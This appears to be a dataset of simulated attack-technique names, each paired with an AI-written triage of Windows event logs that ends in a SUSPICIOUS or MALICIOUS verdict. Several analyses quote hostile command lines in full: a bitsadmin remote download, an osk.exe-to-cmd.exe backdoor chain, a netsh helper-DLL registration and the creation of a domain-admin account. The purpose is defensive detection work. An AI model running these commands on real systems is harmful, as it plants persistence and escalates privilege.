   - The execution of `cmd.exe` with embedded registry modification commands suggests possible automation or scripting aimed at changing system behavior. The path used (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`) is also suspect, as temporary directories are often used for transient or ephemeral tasks that can evade traditional monitoring.

3. **Usage of Diagnostic and Developer Tools:**
   - The use of `whoami.exe` and `hostname.exe` by the user `SERVER002\admin_test` reflects a method often used by attackers to gain information about the current user and system environment. While these tools are benign in isolation, their pattern of usage can indicate reconnaissance activity.

4. **Edge Update Suspicion:**
   - While the execution of Microsoft Edge related updates is noted, these activities seem benign as they show proper versioning and file paths typical for Microsoft updates. However, they warrant monitoring to ensure no tampered or malicious executions are leveraging these update paths.

Overall, the combination of registry modifications, unusual command executions, and system information gathering indicates a pattern consistent with potential malicious intent. While not every event on its own may be harmful, the grouping of these types of events suggests an effort to establish persistence or evade detection.

### Assessment of Threat and Resolution:
Based on the analysis:
- **Threat Level:** The activity observed in the logs should be considered suspicious due to the registry manipulations and administrative command line executions.
- **Risk:** If left uninvestigated, these activities could lead to unauthorized system changes and potential data compromise.
- **Guidance:** It's advisable to conduct further investigation to verify the source and intent of these activities. Validate whether the actions were part of legitimate administrative tasks or scripts. Check for any unauthorized users or processes associated with the command executions and registry changes.

**Resolution: SUSPICIOUS** - The logs contain activities that warrant further investigation to confirm their legitimacy and ensure system security."
Append malicious start-process cmdlet,"**Detailed Analysis of the Logs:**

1. **PowerShell Logs:**
   - The logs indicate that several PowerShell sessions were initiated with command lines involving the addition of content to the PowerShell profile and the scheduled start of `calc.exe` (Windows Calculator) upon launching PowerShell. The use of ""Add-Content $profile"" to manipulate the user profile is typically seen in persistence mechanisms used by threat actors to execute arbitrary commands whenever PowerShell is started.
   - The execution of `calc.exe` itself is typically benign; however, the modification of the PowerShell profile to achieve this indicates a possible attempt to test or verify the persistence mechanism.

2. **Security Logs:**
   - Multiple successful logon events (4624) for the SYSTEM user, along with special privileges assigned (4672), are observed. This is typical for system-initiated processes but could be leveraged if an attacker has gained SYSTEM-level access.
   - There are events (5379) indicating failures in accessing certain credentials, likely representing an attempt to access secured system services or Microsoft accounts unsuccessfully. While this is not inherently malicious, in combination with other activities, it could indicate unauthorized access attempts.

3. **Sysmon Logs:**
   - The logs capture multiple execution instances of PowerShell. The `powershell.exe` executions with suspicious command lines match those found in the PowerShell logs, confirming manipulation attempts with `Add-Content`.
   - Instances of `wevtutil.exe` and `whoami.exe` executions by the same user context may indicate reconnaissance activities to enumerate user/system information and manipulate event logs.
   - The execution of Windows system utilities like `sc.exe`, `rundll32.exe`, and telemetry-related processes appears typical for a Windows environment, though any unauthorized execution of these could indicate an intrusion vector.
   - There were Edge Update logs which seem typical for system and application maintenance activities.

4. **Application Logs:**
   - No significant entries indicating anomalies or suspicious activity were detected within this context.

**Assessment of the Situation:**

The consistent appearance of PowerShell activity modifying the user profile to spawn processes each time PowerShell is started is notably suspicious. It is indicative of an attempt to establish persistence on the system, which could be malicious. This type of operation is commonly associated with initial stages of a cyber intrusion or red teaming exercises.

**Threats or Risks Identified:**

- **Persistence Mechanism via PowerShell:** The modification of PowerShell profiles indicates a potential risk for further exploitation or backdoor access.
- **Reconnaissance and Enumeration:** The execution of reconnaissance commands, combined with other command-line activities, alludes to possible preparatory actions for further exploitation.

**Guidance on How to Proceed:**

- **Immediate Containment:** Ensure that no unauthorized access to the system is currently happening. Review user access policies and validate the integrity of user credentials.
- **Forensic Analysis:** Conduct a more detailed forensic investigation into the modified PowerShell profiles and assess any changes to scheduled tasks or autostart entries.
- **Monitoring & Alerts:** Increase monitoring measures and generate alerts for any PowerShell activities resembling those in the logs.
- **Remediation:** Remove any unauthorized persistency mechanisms by cleaning up PowerShell profiles and verify against known-good configurations.
- **User Education & Awareness:** Educate users about the risks of PowerShell misuse and reinforce best practices.

**Final Resolution:** 
- **SUSPICIOUS** - The logs contain activities involving potential persistence mechanisms, indicating behavior that warrants further investigation to rule out malicious intent."
Create a new user in PowerShell,"Upon analyzing the provided Windows event logs, several notable observations can be made regarding potential malicious activity, primarily highlighted through the Windows PowerShell logs. Here's a detailed assessment:

1. **PowerShell Activity:**
   - An unusual PowerShell command is executed to create a new local user account `data.001_PowerShell` using the command:
     ```
     {New-LocalUser -Name ""data.001_PowerShell"" -NoPassword}
     ```
   - The creation of a user account via a PowerShell script without a password is highly suspicious. Typically, such activity may indicate an attempt to create a backdoor account without proper credentials, which is a common tactic used by attackers post-compromise.

2. **Security Events:**
   - Event ID 4720 indicates the creation of the new user `data.001_PowerShell`.
   - Following the creation, the user account was enabled (event ID 4722) and subsequently modified (event ID 4738).
   - The user was also added to a security-enabled local group (event ID 4728). The specific group is not specified in the logs, but this often indicates an attempt to escalate privileges or establish persistence.

3. **Kernel and Time Events:**
   - There are events related to system time changes (Event ID 1 and 24), which can sometimes be indicative of attempts to manipulate system timestamps, potentially to cover tracks.

4. **Sysmon Logs:**
   - Processes like `whoami.exe` and `hostname.exe` appear multiple times and can be used to gather information regarding the system, though not inherently malicious, it is often observed in scripts checking system context or debugging tools used by attackers.
   - The creation of various system processes initiated by the `admin_test` account is evident and could suggest unauthorized scripts execution or testing reconnaissance tools.

5. **Privileged Access:**
   - The `admin_test` user has been granted multiple highly privileged rights (Event ID 4672), indicative of elevated access which could be misused if the account is not appropriately monitored or secured.

**Assessment:**
The logs suggest suspicious behavior, primarily due to the creation and subsequent manipulation of a user account via PowerShell without a password, coupled with additions to groups and potential time manipulation. These actions align with typical tactics used in advanced persistent threat scenarios aiming to establish persistence, increase access, and potentially obfuscate activities.

**Resolution:**
- **SUSPICIOUS**: The actions documented in the logs are highly suspicious and warrant further investigation. Immediate steps should include:
  - Validate the necessity and legitimacy of the `data.001_PowerShell` account.
  - Review the `admin_test` account activities and implement monitoring if not in place.
  - Verify any other associated activities around the time of these events for additional context.
  - Check for other unauthorized accounts or modifications in the system.
  - Consider conducting a fuller security posture assessment on Server002 and involved networks.

Prompt action and thorough investigation should be conducted to either confirm the activities as benign or take corrective actions to remediate potential unauthorized access or compromise."
Bitsadmin Download (cmd),"Upon reviewing the provided Windows event logs, several lines are noteworthy and potentially indicative of suspicious or malicious activity, as outlined below:

### Observations:

1. **Sysmon Logs - Bitsadmin Usage**:
   - The execution of `bitsadmin.exe` triggered by `cmd.exe` with specific command-line arguments:
     ```plaintext
     ""cmd.exe"" /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\\bitsadmin1_flag.ps1
     ```
   - This command tries to download a file using `BITSAdmin`, which is suspicious because BITSAdmin is often used by attackers to covertly download malicious payloads due to its ability to work in the background and its trustworthiness as a Windows service.

2. **Privilege and Execution Context**:
   - The executing user context is `SERVER002\\admin_test` with high integrity level, suggesting administrative privileges were used to execute the command. This could imply potential privilege misuse.

3. **Process Execution Patterns**:
   - There is repeated use of system32 binaries such as `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` linked with the `admin_test` user, showing interactions consistent with typical administrative or maintenance tasks. However, when combined with the BITS download activity, it could indicate an attacker leveraging valid tools to cover tracks.

4. **Edge Update Anomalies**:
   - The Edge Update processes have a high frequency of execution in various directories, which is typically legitimate system behavior but should always be monitored. No immediate malicious indicators here, but it should be verified to ensure it's standard activity.

### Conclusion:

The use of `BITSAdmin` in the context described is a well-known technique for downloading potentially malicious files from the internet, which suggests the presence of malicious activity. The combination of administrative rights, execution from a system process context, and the nature of the command-line usage are red flags in this context.

### Resolution: MALICIOUS

### Recommended Actions:

- **Immediate Isolation**: Secure the affected system (SERVER002) from the network to prevent any potential spread or further data exfiltration.
- **Thorough Inspection**: Conduct a detailed file and process audit on SERVER002 to trace if the downloaded script was executed and identify any unauthorized changes or malware deployment.
- **Log and Network Monitoring**: Intensify monitoring on similar activity across the network and review recent network traffic to and from the machine for any anomalous connections or data transfer.
- **Password and Credential Update**: Reset credentials of any users, mainly `admin_test`, that may have been compromised, and consider additional security measures such as two-factor authentication.
- **Incident Response Engagement**: Engage IT and security teams to implement a full incident response protocol, considering potential lateral movement and a thorough review of related systems."
Office Application Startup - Outlook as a C2,"## Analysis

### Security Log Analysis
The security log contains two events (Event ID 4616) related to system time change attempts initiated by the `svchost.exe`, running as `NT AUTHORITY\LOCAL SERVICE`. This is not inherently indicative of malicious activity as time adjustments, especially in server environments, can be routine, but the context can determine its relevance.

### Sysmon Log Analysis
1. **Process Execution with Elevated Integrity:**
   - Processes like `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, `reg.exe`, and `wevtutil.exe` are executed by the `SERVER002\admin_test` user at High Integrity Level. The Sysmon logs show multiple executions of system binaries (`hostname.exe`, `whoami.exe`, `wevtutil.exe`, etc.), which are typically benign, but the context suggests a script or automated task running potentially for system inventory or audit.
   
2. **Registry Modification:**
   - The `cmd.exe` process executed a command modifying the Windows Registry (`reg add`) under the path `HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level`, which could be an attempt to alter Outlook security settings. The command embeds sub-operations including directory creation and file manipulations which can be suspicious if not initiated by expected administrative tasks or software policy updates.

3. **Frequency and Rapid Succession of Commands:**
   - The rapid succession of legitimate command-line utility executions such as `whoami.exe`, `hostname.exe`, `cmd.exe`, `reg.exe`, and `wevtutil.exe` can sometimes highlight an automated script running. Specifically, using `reg.exe` to alter registry settings related to Outlook security should be scrutinized for legitimacy in a corporate/enterprise environment.

### Application Log Analysis
-  The `Software Protection Platform Service` events logged (Event ID 16384) relate to routine operations such as license validations and system checks.

### System Log Analysis
- Time synchronization occurs indicating a system time change (Event ID 1), matching security log events. These look routine and correlate with regular Time Service operations syncing with `time.windows.com`.

### Additional Observations
- The presence of processes being spawned under the `wsmprovhost.exe` (Windows Remote Management service host) is expected in scenarios involving remote Windows Management Instrumentation (WMI) tasks, which might be normal for remotely managed systems but should be verified against expected administrative actions.

## Assessment
1. **Benign Activities** are present in terms of regular time adjustments and certain routine service initializations.
2. **Suspicious Activity:**
   - **Registry modification and system utility executions** in rapid succession stand out as likely suspicious if not correlated with known administrative scripts or system management tasks.
   - **Use of `cmd.exe` and `reg.exe` to modify security settings or files is concerning**, especially under elevated privileges if not aligned with IT deployment schedules or security policies.

## Conclusion

### Resolution: SUSPICIOUS

While many events can align with routine administrative actions or scheduled tasks managed via system policies, the specific use of commands to modify registry settings should be further investigated. The actions need to be verified against enterprise policies to confirm if they were executed by authorized personnel or scheduled tasks. If unrecognized, there could be a covert attempt to manipulate security settings that may indicate stage setting for future attacks or unauthorized changes. It is recommended to:

1. Verify recently executed scripts or scheduled tasks for correlation.
2. Check user activity logs, email, or communication history for contextual legitimacy.
3. If the context of the registry modification appears unauthorized or unexpected, initiate necessary incident response protocols to mitigate potential exposure or risks."
Create Symbolic Link From osk.exe to cmd.exe,"Upon reviewing the provided logs, here is the detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Time Change Events**:
   - Multiple changes in system time were recorded around `2024-10-27 13:54:16.988`. These changes could be part of legitimate synchronization activities or indicate attempts to manipulate system time to evade detection mechanisms such as scheduled tasks or logging timestamp manipulation.

2. **Use of `cmd.exe`**:
   - There is a `cmd.exe` execution with complex command-line parameters:
     ```plaintext
     IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd ) & takeown /F %windir%\System32\osk.exe /A & icacls %windir%\System32\osk.exe /grant Administrators:F /t & del %windir%\System32\osk.exe & mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
     ```
   - This command is highly suspicious as it is intended to back up the `osk.exe` (the on-screen keyboard), take ownership, modify permissions, delete it, and then create a symbolic link pointing to `cmd.exe`. This is indicative of a potential privilege escalation or persistence mechanism commonly known as ""Application Hijacking"".

3. **Execution of Several System Utilities by `admin_test`**:
   - Execution of `whoami.exe` followed by `wevtutil.exe` and `hostname.exe`. While execution of utilities like `whoami` may be benign when troubleshooting, the pattern and timing with other suspicious activities raise concerns of credential or environment probing.

4. **Privilege Usage**:
   - The `admin_test` user was noted to have multiple high-level privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) alongside standard logon events. These could be consistent with normal administrative activities but can also suggest privilege abuse if they coincide with unauthorized actions like the `osk.exe` modifications.

### Indicators of Malicious Activity:

1. **`cmd.exe` Command Execution**:
   - The use of `cmd.exe` with parameters to take control of an executable in the Windows system directory and replace it is a clear indicator of malicious activity.
   
2. **System Time Manipulation**:
   - Repeated time changes, if unauthorized, can be used to avoid detection in logging or scheduled tasks. It further corroborates potential malicious intentions.

### Assessment:
- Based on the analysis, the behavior detailed within the logs indicates **MALICIOUS** activity. The alterations of critical system file operations combined with potentially evasive time-change tactics point to a compromised host with malicious intent, likely involving privilege escalation and persistence strategies.

### Recommendations:
- **Immediate Isolation**:
  - Isolate the system ""Server002"" from the network to prevent further potential spread or data exfiltration.
  
- **Deep Forensic Analysis**:
  - Perform a detailed forensic investigation on ""Server002"" focusing on file integrity checks and verifying unauthorized access or data manipulation.
  
- **User Account Review**:
  - Audit the user account `admin_test` for any unauthorized changes or privileges and reset credentials.
  
- **Patch and Secure**:
  - Ensure all software is up to date with patches and review group policies to prevent similar privilege abuse attempts.

- **Monitoring and Alerting**:
  - Enhance monitoring and alerting for similar suspicious activities, focusing on critical file accesses and alterations.
  
Conclusively, corrective measures should prioritize understanding the attack vector to prevent recurrence and ensure holistic network security measures are reviewed and reinforced."
Netsh Helper DLL Registration,"Based on the examination of the provided logs, here is the analysis:

### Suspicious or Anomalous Observations:
1. **Command-Line Activities:**
   - There is a suspicious use of `cmd.exe` with the command `""cmd.exe"" /c netsh.exe add helper ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\NetshHelper.dll"" & taskkill /im notepad.exe /t /f > NUL 2>&1""`. The action of adding a helper DLL using `netsh.exe` is unconventional and could potentially be an attempt to introduce a malicious DLL into the system.
   
2. **Unusual DLL Activity:**
   - The presence of `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\NetshHelper.dll` being loaded is anomalous. The usage of the `Temp` directory for a DLL could be indicative of malicious intent, as these directories are often used by malware to store payloads temporarily.

3. **System Processes Used in Suspicious Manner:**
   - Repeated executions of system binaries like `wevtutil.exe` and `hostname.exe` without a clear legitimate purpose can indicate reconnaissance or activities used to mask malicious behavior.
   
4. **Edge Update Activities:**
   - While the activities related to `MicrosoftEdgeUpdate.exe` could be benign, the presence of multiple instances and updates at the same time could be worth monitoring to ensure that this isn't being used illicitly, e.g., by malware masquerading as legitimate updates.

5. **Use of High Integrity Level:**
   - Many processes are running at a high integrity level, which is often necessary for certain administrative tasks but can also be leveraged for privilege escalation by malicious entities.

### Potential Malicious Activity:
- **DLL Injection Attempts:**
  - The use of `netsh.exe` to add a helper DLL from a temp directory is a recognized technique used for DLL injection attacks. This activity strongly indicates a potential compromise.

- **Process Enumeration/Surveillance:**
  - The use of `whoami.exe` and related process discovery commands without a known administrative task assigned to the user `admin_test` could indicate surveillance or enumeration by an adversary.

### Recommendations:
- **Immediate Investigation:**
  - The observed behavior involving the execution of `cmd.exe` and `netsh.exe` with specific parameters should be flagged and investigated immediately. The source and content of `NetshHelper.dll` should be checked urgently.
  
- **Monitoring of Edge Update processes:**
  - Although the Edge Update entries might be benign, it might be useful to compare these logs against known-bad signatures or check whether there are processes or files masquerading as legitimate Edge components.
  
- **User Activity Audit:**
  - Given that many suspicious activities are being executed by the user `SERVER002\\admin_test`, it’s crucial to verify the legitimacy of this user’s actions and their necessity on the system.

### Conclusion and Resolution:

Considering the suspicious use of legitimate tools, potential DLL injection, and unexplained high-integrity level executions, this activity should not be overlooked. Therefore, the resolution based on the log assessment is:

**Resolution: SUSPICIOUS**

This means that while there's a high degree of questionable activities, we need more investigation to confirm malicious intent beyond speculation. Immediate follow-up actions and forensics on the CEO's machine are warranted to discern the extent and nature of potential threats."
Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,"Based on the provided Windows event logs from the CEO's machine, a detailed analysis was conducted to identify any suspicious or malicious activities.

**Analysis Summary:**

1. **Time Manipulation:**
   - Several logs indicate that the system time was altered:
     - `Kernel-General (EventID 1)`: New and Old time discrepancies.
     - `Security-Auditing (EventID 4616)`: Reflects these time changes.
   - While time synchronization activities can be legitimate, frequent and unusual changes in system time can be a tactic used by attackers to evade detection.

2. **Unusual Command Execution:**
   - **Registry Modifications via CMD:**
     - `Sysmon (EventID 1)`: Instances of `cmd.exe` executing commands to manipulate registry keys related to accessibility tools, specifically for `malware_test`.
     - These modifications include setting values such as `TerminateOnDesktopSwitch` and `StartEXE` to point to `cmd.exe`, possibly indicating an attempt to establish persistence or execute a script on certain triggers.
   - Executing these kinds of registry changes is not typical for day-to-day operations and suggests potential preparation for unauthorized administrative actions or configuring backdoors.

3. **Process and User Behavior:**
   - Execution of `whoami.exe`, `hostname.exe`, and `reg.exe`, while they are legitimate Windows binaries, their repeated execution around the time of registry modifications may indicate reconnaissance or preparatory steps for further actions.
   - All these tasks run under `SERVER002\admin_test` with `High` integrity, suggesting they are running with elevated privileges which are necessary to make system-wide changes such as registry modifications.

4. **Network and System Logs:**
   - No direct evidence of network exfiltration or unusual connections appears in the logs, however, these logs are primarily focused on process creation and time changes.

5. **Other Observations:**
   - Some typical system operations like `Microsoft Edge Update` and `WmiPrvSE.exe` appear benign and are likely unrelated to the anomaly.
   - `Microsoft-Windows-Time-Service` sync from `time.windows.com` is standard, but correlating these with unauthorized time changes could be revealing if the time change was unsanctioned.

**Assessment and Resolution:**

Upon reviewing the logs, the most concerning behavior is the registry modifications which do not align with typical user behavior and suggest an attempt to establish a form of persistence or malicious automation.

Given the nature of observed activities, these logs contain activities that appear coordinated and potentially harmful, indicating deliberate alterations and misuse of system components.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the machine to prevent external communications and further potential harm.
   - Investigate any related alerts or triggers in your EDR (Endpoint Detection and Response) system for better context and correlation.

2. **Forensic Analysis:**
   - Conduct a thorough forensic investigation to determine any further actions taken by potential intruders and any compromised credentials.
   - Analyze additional logs (such as network and PowerShell logs) for broader context.

3. **Mitigations:**
   - Change administrative passwords and check for unauthorized accounts or permissions.
   - Review and clean up any changes to the registry, particularly suspicious entries, ensuring the integrity of critical system components.

4. **Preventive Measures:**
   - Strengthen monitoring for suspicious registry activities and unauthorized time changes.
   - Update security policies to include additional scrutiny on systems with elevated privileges and critical roles. 

This assessment highlights malicious intent and offers a pathway to mitigate and prevent further compromise."
COM hijacking via TreatAs,"Based on the provided log entries, there are several indicators of potentially malicious activity:

1. **PowerShell Usage**: 
   - There is a series of PowerShell commands involving significant modifications to the Windows Registry, specifically under `HKEY_CURRENT_USER\SOFTWARE\Classes\`. These commands are configuring a variety of registry keys and values that seem to relate to COM object registration and execution (`CLSID`, `InprocServer32`, `ProgID`, and `ScriptletURL`) using `reg.exe`. 
   - The `ScriptletURL` contains a URL link to a script hosted on GitHub, which is downloaded and referenced in the registry. This behavior is common in fileless malware, which executes a script from a URL to achieve persistence or execute malicious code.

2. **Use of `rundll32.exe`**:
   - Following these registry modifications, `rundll32.exe` is executed with the argument `-sta ""fileTest""`, which suggests an execution of a potentially malicious DLL or object. This technique is often seen in attacks where `rundll32.exe` is used to execute scripts or malicious payloads that are embedded within the registry or hosted remotely, leveraging a method known as Living off the Land (LotL).

3. **Execution Context**:
   - All suspicious activities are executed under the context of a user account, `SERVER002\admin_test`, indicating possible exploitation of the user's credentials to perform these actions.

4. **Abnormal Process Activity**:
   - The logs also indicate the sequential launching of legitimate Windows processes (such as `wevtutil`, `conhost`, etc.) around the same timestamp as the PowerShell activity, potentially to blend malicious actions into normal system activities.

5. **Sysmon Logs**:
   - Detailed process creation events in the Sysmon logs show the flow and origin of these suspicious processes linked with the PowerShell execution, originating from `wsmprovhost.exe`, indicating that some form of remote command execution (possibly via Windows Remote Management) may be involved.

**Assessment**:
Given the evidence of registry manipulation for the sake of COM registration coupled with remote script execution via PowerShell, the signs indicate potentially malicious activity consistent with common tactics used to gain persistence and execute payloads.

**Resolution**: MALICIOUS

**Guidance**:
- Immediately isolate the affected machine (Server002) from the network to prevent the spread of malicious activity.
- Conduct a thorough examination of the user's account `SERVER002\admin_test` for unauthorized access or compromise.
- Analyze the downloaded script from GitHub to assess its functionalities and potential malicious intent.
- Review the network activity logs for connections to the GitHub URL and other potentially malicious domains.
- Revert unknown and unauthorized changes made to the registry.
- Consider implementing stricter monitoring and controls on PowerShell execution and registry modifications.
- Ensure all systems have updated security patches and antivirus definitions."
Adding custom debugger for Windows Error Reporting,"**Analysis of Windows Event Logs:**

Upon reviewing the provided logs, several relevant observations can be made that indicate potential suspicious activity on the system.

1. **Timestamp Manipulation:**
   - A Windows Security Log event (EventID 4616) indicates that the system time was altered by the process `C:\Windows\System32\svchost.exe` on October 27, 2024. This event was recorded twice, showing minor adjustments in the system time. While time adjustments can happen legitimately as a result of time synchronization services, frequent or unauthorized changes could mask malicious activities or log entries.

2. **Registry Modification:**
   - A `cmd.exe` process executed a command that modifies the Windows registry key related to Windows Error Reporting. The command is: 
     ```
     cmd.exe /c reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs"" /v Debugger /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f
     ```
   - This type of modification can be used to hijack error reporting for privilege escalation or persistence. While notepad.exe as a debugger is less common, it should raise suspicion, especially in the context of execution by a high-integrity level process.

3. **Process Execution:**
   - The execution of several basic system utilities such as `hostname.exe`, `whoami.exe`, and `wevtutil.exe` occurs within a very tight timeframe and from a high integrity level context under the user `SERVER002\admin_test`. While these utilities can be used for diagnostics or administrative purposes, their use in chains can often be part of reconnaissance or lateral movement activities in compromised environments.

**Assessment:**

- The registry modification attempt combined with the tight clustering of utility executions at a high integrity level suggests that this activity could be a part of a larger attack script or manual intervention aimed at maintaining control or altering system behavior.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Conduct Further Investigation:**
   - Follow up with more detailed analysis, focusing on:
     - Identifying the source of the script or commands.
     - Checking user authentication and authorization logs for irregularities, especially any deviations in behavior from the `admin_test` account.
     - Examining any other connected systems for similar patterns of logged events.
   
2. **Review System Changes:**
   - Examine change logs to clarify whether any legitimate maintenance activity possibly explains the registry modification and time changes. 

3. **Monitor Activities:**
   - Increase monitoring on `SERVER002`, especially focusing on processes like `cmd.exe`, `conhost.exe`, and `reg.exe` for any further suspicious activities.
   
4. **Security Posture Assessment:**
   - Review and enhance security configurations, including ensuring that time synchronization is securely managed, controlling the use of registry modifications, and checking privilege account activity.

5. **Consider Restoration:**
   - If unauthorized activities are confirmed, consider isolating or restoring the system to a known good state to remove potential persistent threats.

The activities observed are suspicious and point toward potentially malicious behavior, necessitating more detailed investigation to rule out compromise."
Powershell Execute COM Object,"Upon reviewing the provided Windows event logs for the CEO's machine, the following analysis has been performed:

### Suspicious/Anomalous Behavior:
1. **Time Manipulation Events**:
   - Multiple `EventID 4616` from the Security log indicates that there is a change in the system time. The 'NewTime' is set earlier than the 'PreviousTime', indicating a potential rollback of system time.
   - System time manipulation can be an indicator of attempts to evade security controls or logs.

2. **Logon Events and Privilege Assignments**:
   - `EventID 4624` in the Security log shows a successful logon for user `admin_test` with `LogonType 3` (network logon), originating from IP address `192.168.0.102`. 
   - `EventID 4672` shows that the `admin_test` user was granted a range of high-level privileges, including `SeDebugPrivilege` and `SeBackupPrivilege` which are not typically needed for regular activities and may suggest malicious intent.

3. **Process Creation via PowerShell**:
   - In the Sysmon logs, `EventID 1` shows the execution of `powershell.exe` with a command line that attempts to instantiate a COM object and execute `cmd.exe` to launch `calc.exe`. This use of PowerShell for direct manipulation of COM objects and command execution is unusual and indicative of suspicious activity.

### Indicators of Malicious Activity:
- The use of PowerShell to create an instance of a COM object and then execute commands is characteristic of malicious behavior often seen in post-exploitation frameworks. The host application using PowerShell script to open `cmd.exe` and run `calc.exe` is particularly concerning, as such behavior could be part of a testing phase by an adversary or a simulation of remote code execution.

- The manipulation of system time is another red flag, suggesting attempts to cover the tracks of activities by altering timestamps of logs and files.

### Assessment & Guidance:
Based on the analysis of the logs, there are clear indications of potentially malicious activities targeting the CEO's machine. The PowerShell activity and the time change events particularly suggest deliberate manipulation and execution that are not typically associated with legitimate user actions. Thus, the resolution for this analysis is:

**Resolution: MALICIOUS**

### Recommended Actions:
1. **Immediate Containment**:
   - Isolate the affected system from the network to prevent further unauthorized access or propagation of potential threats.
   - Notify relevant stakeholders, including IT and network security teams.

2. **Forensic Analysis**:
   - Conduct a detailed forensic analysis of the system to determine the full scope of the intrusion and the potential data accessed or exfiltrated.
   - Collect and analyze any artifacts, such as registry hives, file accesses, and network connections.

3. **Remediation**:
   - Validate and reset access credentials, particularly for users with elevated privileges such as `admin_test`.
   - Implement additional monitoring and alerting on the network and key assets to detect similar patterns of behavior.

4. **Review and Enhance Security Posture**:
   - Review and enhance system hardening measures, especially concerning PowerShell execution policies and audit configurations.
   - Assess and update the time synchronization configurations and lockdown mechanisms to prevent unauthorized time changes.
"
Registry key creation and-or modification events for SDB,"Upon reviewing the provided logs, several potentially suspicious activities can be noted. Here is a detailed breakdown:

1. **Use of PowerShell Commands**:
   - The Windows PowerShell log indicates that a script was executed using PowerShell that modifies the registry at `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom` and `InstalledSDB`. This kind of activity is often seen in malicious activity where registry persistence or system configuration is modified to evade detection.
   - The PowerShell script lacks clear context for its necessity, making it suspicious without additional context.

2. **High-Integrity Levels for Non-System User**:
   - Sysmon logs show processes like `hostname.exe`, `whoami.exe`, and `powershell.exe` executed under high integrity levels by the user `SERVER002\admin_test`. While legitimate programs like `whoami.exe` may be used for scripting or auditing purposes, their execution at a high integrity level by a non-system user can indicate privilege misuse or escalation attempts.

3. **Abnormal Process Creation and Execution Context**:
   - The execution of command-line processes like `conhost.exe` under unusual command-line parameters (`0xffffffff -ForceV1`) seems out of the ordinary and might indicate attempts to interact with or hide console windows, potentially for malicious purposes.

4. **Registry and File Attribute Changes**:
   - The System log records process actions like `wevtutil.exe` which can be leveraged in clearing event logs, a potential indicator of a cover-up attempt after malicious activity.

5. **Frequent and Rapid Process Executions**:
   - Various system processes including `MicrosoftEdgeUpdate.exe` are executed multiple times, which is common in legitimate update processes. However, such actions coming with scant system context raise concerns, especially when coupled with other suspicious activities.

Given the evidence of PowerShell misuse, high-integrity process executions without clear justification, and potential tampering of system configurations through registry changes, the provided logs indicate **SUSPICIOUS** activity. Immediate action is warranted to further investigate the pattern of suspicious commands for malicious intent:

- **Recommendations**:
  1. **Isolate Affected Machine**: Start with immediate isolation of the system (Server002) to prevent potential lateral movement.
  2. **Perform Incident Response**: Conduct a deeper analysis with full forensic imaging and memory dumping to understand the scope of actions conducted by the involved accounts and processes.
  3. **Review Recent System Changes**: Audit registry and file system changes facilitated by `admin_test` to determine potentially unauthorized modifications.
  4. **Elevate Monitoring**: Implement enhanced monitoring of PowerShell execution and registry changes across the network to identify further misuse or widespread intrusion tactics.
  5. **Assess Impact**: Check other systems for similar suspicious activities or account behaviors in case of broader network compromise.

This activity needs thorough investigation to definitively categorize its impact as benign or malicious."
Create a new Windows domain admin user,"### Analysis

Upon analyzing the logs, several entries point towards potentially malicious activity:

#### Sysmon Log Analysis:
1. **Event ID 1 (Process Creation)**:
   - Multiple instances of process creation activities can be seen associated with the user ""admin_test"", involving processes like `cmd.exe`, `net.exe`, and `net1.exe` with commands indicative of user creation and group privilege escalation.
   - A notable command `cmd.exe /c net user ""data.002_Admin"" ""data_pass123!"" /add /domain & net group ""Domain Admins"" ""data.002_Admin"" /add /domain` indicates an attempt to create a user and add it to the Domain Admins group, which is a serious sign of privilege escalation and indicates a potential compromise.

2. **Concerning Processes**:
   - `net.exe` and `net1.exe`: These are Windows Network commands used for administrative purposes. The logs show these were used with parameters to add a user and modify group memberships, indicating possible misuse by a malicious actor.

#### Security Log Analysis:
1. **High Privilege Logins (Event IDs: 4624, 4672)**:
   - There is evidence of an account named ""admin_test"" being used, which possesses substantial privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). The enabling of all these privileges suggests possible privilege escalation through a compromised administrator account.

2. **Time Change Events (Event ID 4616)**:
   - The adjustment of system time (via `svchost.exe`) might be used to obfuscate activities and manipulate logs, although alone it's not inherently malicious without additional context.

#### System & Application Log Analysis:
- No directly suspicious behaviors were found in these logs; however, changes to timezone could correlate with activity obfuscation approached in the logs.

### Assessment
Overall, the logs indicate the following potentially **MALICIOUS** activities:
- Creation of a privileged user account and its addition to the ""Domain Admins"" group using `cmd.exe`.
- The usage of high privileges through an admin_test account.
- Multiple execution of system utilities like `whoami.exe`, `wevtutil.exe`, `hostname.exe`, `conhost.exe`, and `net.exe` in rapid succession, suggesting potential automation scripts or toolkits used by an attacker.

### Recommendations
1. **Immediate Actions**:
   - Isolate the affected system from the network to prevent further unauthorized access or spread.
   - Disable the ""data.002_Admin"" account and any other unusually privileged accounts.
   - Conduct further host-based forensics to identify additional compromised accounts or entry points.

2. **Review Security Policies**:
   - Verify and tighten security policies around privileged account management and monitoring.
   - Implement stronger logging and alerting mechanisms specifically tuned for privilege escalation attempts and account creation.

3. **User Training and Awareness**:
   - Conduct a review of current user privileges and ensure they adhere strictly to the principle of least privilege.
   - Reinforce security training for all users, focusing on recognizing phishing and social engineering attacks, which often precede account comp@romise.

### Conclusion
The observed activities are concerning and align with known malicious behaviors aimed at privilege escalation and persistent access. Therefore, the resolution status is classified as **MALICIOUS**."
